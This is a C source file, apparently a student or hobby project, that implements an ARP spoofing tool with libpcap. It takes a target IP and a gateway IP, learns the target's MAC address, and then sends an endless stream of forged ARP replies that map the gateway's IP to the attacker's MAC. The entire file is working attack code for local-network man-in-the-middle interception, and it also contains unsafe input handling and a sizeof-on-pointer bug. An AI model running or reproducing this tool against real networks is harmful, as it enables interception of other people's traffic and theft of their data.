#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <ifaddrs.h>
#include "protocol_header.h"

#define PROMISC 1
#define ARP_HDR_SIZE 8
#define ETH_HDR_SIZE 14
#define ARP_PAYLOAD_SRT 22

struct ARP_Custom_Packet{
    struct libnet_ethernet_hdr eth_hdr;
    struct libnet_arp_hdr arp_hdr;
    struct libnet_arp_payload arp_payload;
};

void getMyMacAddr(uint8_t* mac_address){
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1){}

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
            strcpy(ifr.ifr_name, it->ifr_name);
            if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
                if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                    if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                        success = 1;
                        break;
                    }
                }
            }
            else { /* handle error */ }
        }

    if (success) memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
}

void getMyIPAddress(char* ip, char* interface){
    struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char host[NI_MAXHOST];

    if (getifaddrs(&ifaddr) == -1)
    {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
    {
        if (ifa->ifa_addr == NULL)
            continue;
        s=getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);

        if((strcmp(ifa->ifa_name, interface)==0)&&(ifa->ifa_addr->sa_family==AF_INET))
        {
            if (s != 0)
            {
                printf("getnameinfo() failed: %s\n", gai_strerror(s));
                exit(EXIT_FAILURE);
            }
            memcpy(ip, host, sizeof(host));
            break;
        }
    }
    freeifaddrs(ifaddr);
}

void makeETH_B_Header(struct libnet_ethernet_hdr* hdr, uint8_t* senderMAC){
    uint8_t ETH_BroadCast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t ETH_Local[6] = {0,};
    memcpy(hdr->ether_dhost, ETH_BroadCast, sizeof(ETH_BroadCast));
    memcpy(ETH_Local, senderMAC, 6);
    memcpy(hdr->ether_shost, ETH_Local, sizeof(ETH_Local));
    hdr->ether_type = htons(0x0806);
}

void makeARP_Header(struct libnet_arp_hdr* hdr, uint16_t op){
    hdr->arp_hrd_type = htons(0x0001);
    hdr->arp_proto = htons(0x0800);
    hdr->arp_hrd_size = 0x6;
    hdr->arp_proto_size = 0x4;
    hdr->arp_op = htons(op);
}

void makeARP_Request_Payload(struct libnet_arp_payload* hdr,
                             uint8_t* senderMac, char* senderIP, char* targetIP){

    int zero = 0;
    in_addr ip_addr;
    int32_t s_ip; //<- 조심!!
    int32_t d_ip;

    memcpy(hdr->s_hw_addr, senderMac, sizeof(senderMac));
    inet_aton(senderIP, &ip_addr);
    s_ip = (ip_addr.s_addr);
    memcpy(hdr->s_ip_addr, &s_ip, 4);
    memset(hdr->t_hw_addr, 0, 6);

    inet_aton(targetIP, &ip_addr);
    d_ip = (ip_addr.s_addr);
    memcpy(hdr->t_ip_addr, &d_ip, 4);
}
void makeARP_Reply_Payload(struct ARP_Custom_Packet* arp_reply_packet, uint8_t* targetMac, uint8_t* myMac, char* gwIP, char* targetIP){
    /*
     *   | Target_MAC |  MY_MAC  |
     *    -----------------------
     *   |   ARP_Request_Packet  |
     *    -----------------------
     *   |   MY_MAC   |   GW_IP  |
     *   | Target_MAC | Target_IP|
     *
     *
     */
    struct libnet_ethernet_hdr eth_hdr;
    struct libnet_arp_hdr arp_hdr;
    struct libnet_arp_payload arp_payload;

    uint16_t op = 2;
    memcpy(eth_hdr.ether_dhost, targetMac, 6);
    memcpy(eth_hdr.ether_shost, myMac, 6);
    eth_hdr.ether_type = ntohs(0x0806);
    makeARP_Header(&arp_hdr, op);

    memcpy(arp_payload.s_hw_addr, myMac, 6);
    in_addr inaddr;
    inet_aton(gwIP, &inaddr);
    memcpy(arp_payload.s_ip_addr, &inaddr.s_addr, 4);
    memcpy(arp_payload.t_hw_addr, targetMac, 6);
    inet_aton(targetIP, &inaddr);
    memcpy(arp_payload.t_ip_addr, &inaddr.s_addr, 4);

    memcpy(&arp_reply_packet->eth_hdr, &eth_hdr, sizeof(libnet_ethernet_hdr));
    memcpy(&arp_reply_packet->arp_hdr, &arp_hdr, sizeof(libnet_arp_hdr));
    memcpy(&arp_reply_packet->arp_payload, &arp_payload, sizeof(libnet_arp_payload));
}
int main(int argc, char* args[]){
/* arpSp -i [interface] -t [Target IP] -r [router IP] */
    char my_IP[20];
    char interface[10];
    char target_IP[20];
    char gw_IP[20];
    uint8_t my_MAC[6];

    printf("interface >> ");
    scanf("%s",interface);
    printf("target_IP >> ");
    scanf("%s",target_IP);
    printf("gw_IP >> ");
    scanf("%s",gw_IP);

    struct libnet_ethernet_hdr broadcast_eth_hdr;
    struct libnet_arp_hdr arp_request_hdr;
    struct libnet_arp_payload arp_payload;
    struct ARP_Custom_Packet arp_request_packet;
    uint16_t op;
    char buf[18];
    u_char flush[50];
    uint8_t target_MAC[6];
    pcap_pkthdr* pcap_header = NULL;
    const u_char* pcap_payload = NULL;
    struct libnet_ethernet_hdr* eth_hdr;
    struct libnet_arp_hdr* arp_hdr;

    getMyIPAddress(my_IP, interface);
    getMyMacAddr(my_MAC);

    makeETH_B_Header(&broadcast_eth_hdr, my_MAC);
    makeARP_Header(&arp_request_hdr, op = 1);
    makeARP_Request_Payload(&arp_payload, my_MAC, my_IP, target_IP/*Target IP*/);
    memcpy(&arp_request_packet.eth_hdr, &broadcast_eth_hdr, sizeof(libnet_ethernet_hdr));
    memcpy(&arp_request_packet.arp_hdr, &arp_request_hdr, sizeof(libnet_arp_hdr));
    memcpy(&arp_request_packet.arp_payload, &arp_payload, sizeof(libnet_arp_payload));

    memcpy(flush, &arp_request_packet, sizeof(ARP_Custom_Packet));

    for (int i = 0; sizeof(flush) > i; i++) {
        printf("%02x ",flush[i]);
        if(i != 0 && i%15 == 0)
            printf("\n");
    }

    pcap_t* pcap_handle = pcap_open_live(interface, 1000, 0, 1000, buf);
    printf("Packet Send....\n");
    pcap_inject(pcap_handle, (u_char*)flush, sizeof(flush));

    while (1) {
        int res = pcap_next_ex(pcap_handle, &pcap_header, &pcap_payload);
        eth_hdr = (libnet_ethernet_hdr*)pcap_payload;

        if(eth_hdr->ether_type == ntohs(0x0806) /*ARP Protocol*/){
            arp_hdr = (libnet_arp_hdr*)&pcap_payload[14];
            if(arp_hdr->arp_op == htons(0x0002) /*ARP Reply*/){
                break;
            }
        }
        eth_hdr = NULL;
        arp_hdr = NULL;
    }
    printf("Packet Recv....\n");
    memcpy(&arp_payload, &pcap_payload[ARP_PAYLOAD_SRT], sizeof(libnet_arp_payload));
    memcpy(target_MAC, arp_payload.s_hw_addr, 6);

    ARP_Custom_Packet arpReply;
    makeARP_Reply_Payload(&arpReply,target_MAC, my_MAC, gw_IP/*Gateway IP*/, target_IP/*Target IP*/);
    memset(flush, 0, sizeof(flush));
    memcpy(flush, &arpReply, sizeof(ARP_Custom_Packet));

    while (1) {
        pcap_inject(pcap_handle, (u_char*)flush, sizeof(flush));
        printf("Send ARP\n");
    }

}
